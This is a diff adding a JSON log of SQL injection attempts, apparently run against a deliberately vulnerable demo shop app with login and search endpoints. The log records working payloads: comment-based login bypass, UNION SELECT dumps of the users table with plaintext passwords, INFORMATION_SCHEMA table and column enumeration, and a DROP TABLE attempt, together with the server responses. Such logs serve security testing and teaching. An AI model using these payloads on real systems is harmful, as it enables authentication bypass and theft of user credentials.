@@ -1,0 +1,1262 @@
+[
+  {
+    "timestamp": "2025-07-17T18:12:53.418043",
+    "endpoint": "login",
+    "payload": {
+      "username": "admin' # ",
+      "password": "qualquer"
+    },
+    "status_code": 200,
+    "response_size": 272,
+    "success": true,
+    "response_data": {
+      "message": "Login realizado com sucesso! Bem-vindo, admin",
+      "success": true,
+      "user": {
+        "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+        "email": "admin@example.com",
+        "id": 1,
+        "password": "admin123",
+        "role": "admin",
+        "username": "admin"
+      }
+    }
+  },
+  {
+    "timestamp": "2025-07-17T18:12:54.491551",
+    "endpoint": "login",
+    "payload": {
+      "username": "' OR 1=1 # ",
+      "password": "qualquer"
+    },
+    "status_code": 500,
+    "response_size": 16235,
+    "success": false
+  },
+  {
+    "timestamp": "2025-07-17T18:12:55.544464",
+    "endpoint": "login",
+    "payload": {
+      "username": "admin' OR '1'='1' # ",
+      "password": "qualquer"
+    },
+    "status_code": 500,
+    "response_size": 16235,
+    "success": false
+  },
+  {
+    "timestamp": "2025-07-17T18:12:56.603032",
+    "endpoint": "login",
+    "payload": {
+      "username": "' OR 'a'='a' # ",
+      "password": "qualquer"
+    },
+    "status_code": 500,
+    "response_size": 16235,
+    "success": false
+  },
+  {
+    "timestamp": "2025-07-17T18:12:57.651114",
+    "endpoint": "login",
+    "payload": {
+      "username": "admin' -- ",
+      "password": "qualquer"
+    },
+    "status_code": 200,
+    "response_size": 272,
+    "success": true,
+    "response_data": {
+      "message": "Login realizado com sucesso! Bem-vindo, admin",
+      "success": true,
+      "user": {
+        "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+        "email": "admin@example.com",
+        "id": 1,
+        "password": "admin123",
+        "role": "admin",
+        "username": "admin"
+      }
+    }
+  },
+  {
+    "timestamp": "2025-07-17T18:12:58.710335",
+    "endpoint": "login",
+    "payload": {
+      "username": "' UNION SELECT 1,2,3,4,5,6 # ",
+      "password": "qualquer"
+    },
+    "status_code": 200,
+    "response_size": 209,
+    "success": true,
+    "response_data": {
+      "message": "Login realizado com sucesso! Bem-vindo, 2",
+      "success": true,
+      "user": {
+        "created_at": "6",
+        "email": "4",
+        "id": 1,
+        "password": "3",
+        "role": "5",
+        "username": "2"
+      }
+    }
+  },
+  {
+    "timestamp": "2025-07-17T18:12:59.760663",
+    "endpoint": "login",
+    "payload": {
+      "username": "admin",
+      "password": "' OR 1=1 # "
+    },
+    "status_code": 500,
+    "response_size": 16235,
+    "success": false
+  },
+  {
+    "timestamp": "2025-07-17T18:13:00.812424",
+    "endpoint": "login",
+    "payload": {
+      "username": "admin",
+      "password": "' OR 'x'='x' # "
+    },
+    "status_code": 500,
+    "response_size": 16235,
+    "success": false
+  },
+  {
+    "timestamp": "2025-07-17T18:13:01.859744",
+    "endpoint": "search",
+    "payload": {
+      "search_term": "' OR 1=1 # "
+    },
+    "status_code": 200,
+    "response_size": 1075,
+    "success": true,
+    "response_data": {
+      "products": [
+        {
+          "category": "categoria1",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto A",
+          "id": 1,
+          "name": "Produto A",
+          "price": "29.99"
+        },
+        {
+          "category": "categoria2",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto B",
+          "id": 2,
+          "name": "Produto B",
+          "price": "49.99"
+        },
+        {
+          "category": "categoria1",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto C",
+          "id": 3,
+          "name": "Produto C",
+          "price": "19.99"
+        },
+        {
+          "category": "categoria3",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto D",
+          "id": 4,
+          "name": "Produto D",
+          "price": "99.99"
+        }
+      ],
+      "query": "SELECT * FROM products WHERE name LIKE '%' OR 1=1 # %' OR description LIKE '%' OR 1=1 # %'",
+      "success": true
+    }
+  },
+  {
+    "timestamp": "2025-07-17T18:13:02.907458",
+    "endpoint": "search",
+    "payload": {
+      "search_term": "' UNION SELECT id,username,password,email,role,created_at FROM users # "
+    },
+    "status_code": 200,
+    "response_size": 1994,
+    "success": true,
+    "response_data": {
+      "products": [
+        {
+          "category": "categoria1",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto A",
+          "id": 1,
+          "name": "Produto A",
+          "price": "29.99"
+        },
+        {
+          "category": "categoria2",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto B",
+          "id": 2,
+          "name": "Produto B",
+          "price": "49.99"
+        },
+        {
+          "category": "categoria1",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto C",
+          "id": 3,
+          "name": "Produto C",
+          "price": "19.99"
+        },
+        {
+          "category": "categoria3",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto D",
+          "id": 4,
+          "name": "Produto D",
+          "price": "99.99"
+        },
+        {
+          "category": "admin",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "admin123",
+          "id": 1,
+          "name": "admin",
+          "price": "admin@example.com"
+        },
+        {
+          "category": "user",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "password123",
+          "id": 2,
+          "name": "user1",
+          "price": "user1@example.com"
+        },
+        {
+          "category": "user",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "mypassword",
+          "id": 3,
+          "name": "user2",
+          "price": "user2@example.com"
+        },
+        {
+          "category": "user",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "test123",
+          "id": 4,
+          "name": "testuser",
+          "price": "test@example.com"
+        }
+      ],
+      "query": "SELECT * FROM products WHERE name LIKE '%' UNION SELECT id,username,password,email,role,created_at FROM users # %' OR description LIKE '%' UNION SELECT id,username,password,email,role,created_at FROM users # %'",
+      "success": true
+    }
+  },
+  {
+    "timestamp": "2025-07-17T18:13:03.964460",
+    "endpoint": "search",
+    "payload": {
+      "search_term": "' UNION SELECT 1,2,3,4,5,6 # "
+    },
+    "status_code": 200,
+    "response_size": 1214,
+    "success": true,
+    "response_data": {
+      "products": [
+        {
+          "category": "categoria1",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto A",
+          "id": 1,
+          "name": "Produto A",
+          "price": "29.99"
+        },
+        {
+          "category": "categoria2",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto B",
+          "id": 2,
+          "name": "Produto B",
+          "price": "49.99"
+        },
+        {
+          "category": "categoria1",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto C",
+          "id": 3,
+          "name": "Produto C",
+          "price": "19.99"
+        },
+        {
+          "category": "categoria3",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto D",
+          "id": 4,
+          "name": "Produto D",
+          "price": "99.99"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": 1,
+          "name": "2",
+          "price": "4.00"
+        }
+      ],
+      "query": "SELECT * FROM products WHERE name LIKE '%' UNION SELECT 1,2,3,4,5,6 # %' OR description LIKE '%' UNION SELECT 1,2,3,4,5,6 # %'",
+      "success": true
+    }
+  },
+  {
+    "timestamp": "2025-07-17T18:13:05.019833",
+    "endpoint": "search",
+    "payload": {
+      "search_term": "' OR 'a'='a' # "
+    },
+    "status_code": 200,
+    "response_size": 1083,
+    "success": true,
+    "response_data": {
+      "products": [
+        {
+          "category": "categoria1",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto A",
+          "id": 1,
+          "name": "Produto A",
+          "price": "29.99"
+        },
+        {
+          "category": "categoria2",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto B",
+          "id": 2,
+          "name": "Produto B",
+          "price": "49.99"
+        },
+        {
+          "category": "categoria1",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto C",
+          "id": 3,
+          "name": "Produto C",
+          "price": "19.99"
+        },
+        {
+          "category": "categoria3",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto D",
+          "id": 4,
+          "name": "Produto D",
+          "price": "99.99"
+        }
+      ],
+      "query": "SELECT * FROM products WHERE name LIKE '%' OR 'a'='a' # %' OR description LIKE '%' OR 'a'='a' # %'",
+      "success": true
+    }
+  },
+  {
+    "timestamp": "2025-07-17T18:13:06.074091",
+    "endpoint": "search",
+    "payload": {
+      "search_term": "'; DROP TABLE users # "
+    },
+    "status_code": 200,
+    "response_size": 1097,
+    "success": true,
+    "response_data": {
+      "products": [
+        {
+          "category": "categoria1",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto A",
+          "id": 1,
+          "name": "Produto A",
+          "price": "29.99"
+        },
+        {
+          "category": "categoria2",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto B",
+          "id": 2,
+          "name": "Produto B",
+          "price": "49.99"
+        },
+        {
+          "category": "categoria1",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto C",
+          "id": 3,
+          "name": "Produto C",
+          "price": "19.99"
+        },
+        {
+          "category": "categoria3",
+          "created_at": "Thu, 17 Jul 2025 19:44:59 GMT",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto D",
+          "id": 4,
+          "name": "Produto D",
+          "price": "99.99"
+        }
+      ],
+      "query": "SELECT * FROM products WHERE name LIKE '%'; DROP TABLE users # %' OR description LIKE '%'; DROP TABLE users # %'",
+      "success": true
+    }
+  },
+  {
+    "timestamp": "2025-07-17T18:13:18.158755",
+    "endpoint": "search",
+    "payload": {
+      "search_term": "' UNION SELECT TABLE_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.TABLES # "
+    },
+    "status_code": 200,
+    "response_size": 15404,
+    "success": true,
+    "response_data": {
+      "products": [
+        {
+          "category": "categoria1",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto A",
+          "id": "1",
+          "name": "Produto A",
+          "price": "29.99"
+        },
+        {
+          "category": "categoria2",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto B",
+          "id": "2",
+          "name": "Produto B",
+          "price": "49.99"
+        },
+        {
+          "category": "categoria1",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto C",
+          "id": "3",
+          "name": "Produto C",
+          "price": "19.99"
+        },
+        {
+          "category": "categoria3",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto D",
+          "id": "4",
+          "name": "Produto D",
+          "price": "99.99"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "ADMINISTRABLE_ROLE_AUTHORIZATIONS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "APPLICABLE_ROLES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "CHARACTER_SETS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "CHECK_CONSTRAINTS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "COLLATIONS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "COLLATION_CHARACTER_SET_APPLICABILITY",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "COLUMNS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "COLUMNS_EXTENSIONS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "COLUMN_PRIVILEGES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "COLUMN_STATISTICS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "ENABLED_ROLES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "ENGINES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "EVENTS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "FILES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_BUFFER_PAGE",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_BUFFER_PAGE_LRU",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_BUFFER_POOL_STATS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_CACHED_INDEXES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_CMP",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_CMPMEM",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_CMPMEM_RESET",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_CMP_PER_INDEX",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_CMP_PER_INDEX_RESET",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_CMP_RESET",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_COLUMNS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_DATAFILES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_FIELDS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_FOREIGN",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_FOREIGN_COLS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_FT_BEING_DELETED",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_FT_CONFIG",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_FT_DEFAULT_STOPWORD",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_FT_DELETED",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_FT_INDEX_CACHE",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_FT_INDEX_TABLE",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_INDEXES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_METRICS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_SESSION_TEMP_TABLESPACES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_TABLES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_TABLESPACES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_TABLESPACES_BRIEF",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_TABLESTATS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_TEMP_TABLE_INFO",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_TRX",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "INNODB_VIRTUAL",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "KEYWORDS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "KEY_COLUMN_USAGE",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "OPTIMIZER_TRACE",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "PARAMETERS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "PARTITIONS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "PLUGINS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "PROCESSLIST",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "PROFILING",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "REFERENTIAL_CONSTRAINTS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "RESOURCE_GROUPS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "ROLE_COLUMN_GRANTS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "ROLE_ROUTINE_GRANTS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "ROLE_TABLE_GRANTS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "ROUTINES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "SCHEMATA",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "SCHEMATA_EXTENSIONS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "SCHEMA_PRIVILEGES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "STATISTICS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "ST_GEOMETRY_COLUMNS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "ST_SPATIAL_REFERENCE_SYSTEMS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "ST_UNITS_OF_MEASURE",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "TABLES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "TABLESPACES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "TABLESPACES_EXTENSIONS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "TABLES_EXTENSIONS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "TABLE_CONSTRAINTS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "TABLE_CONSTRAINTS_EXTENSIONS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "TABLE_PRIVILEGES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "TRIGGERS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "USER_ATTRIBUTES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "USER_PRIVILEGES",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "VIEWS",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "VIEW_ROUTINE_USAGE",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "VIEW_TABLE_USAGE",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "global_status",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "global_variables",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "persisted_variables",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "processlist",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "session_account_connect_attrs",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "session_status",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "session_variables",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "variables_info",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "products",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "users",
+          "name": "2",
+          "price": "4.00"
+        }
+      ],
+      "query": "SELECT * FROM products WHERE name LIKE '%' UNION SELECT TABLE_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.TABLES # %' OR description LIKE '%' UNION SELECT TABLE_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.TABLES # %'",
+      "success": true
+    }
+  },
+  {
+    "timestamp": "2025-07-17T18:13:19.203617",
+    "endpoint": "search",
+    "payload": {
+      "search_term": "' UNION SELECT COLUMN_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' # "
+    },
+    "status_code": 200,
+    "response_size": 2114,
+    "success": true,
+    "response_data": {
+      "products": [
+        {
+          "category": "categoria1",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto A",
+          "id": "1",
+          "name": "Produto A",
+          "price": "29.99"
+        },
+        {
+          "category": "categoria2",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto B",
+          "id": "2",
+          "name": "Produto B",
+          "price": "49.99"
+        },
+        {
+          "category": "categoria1",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto C",
+          "id": "3",
+          "name": "Produto C",
+          "price": "19.99"
+        },
+        {
+          "category": "categoria3",
+          "created_at": "2025-07-17 19:44:59",
+          "description": "Descri\u00c3\u00a7\u00c3\u00a3o do produto D",
+          "id": "4",
+          "name": "Produto D",
+          "price": "99.99"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "created_at",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "email",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "id",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "password",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "role",
+          "name": "2",
+          "price": "4.00"
+        },
+        {
+          "category": "5",
+          "created_at": "6",
+          "description": "3",
+          "id": "username",
+          "name": "2",
+          "price": "4.00"
+        }
+      ],
+      "query": "SELECT * FROM products WHERE name LIKE '%' UNION SELECT COLUMN_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' # %' OR description LIKE '%' UNION SELECT COLUMN_NAME,2,3,4,5,6 FROM INFORMATION_SCHEMA.COLUMNS WHERE TABLE_NAME='users' # %'",
+      "success": true
+    }
+  }
+]
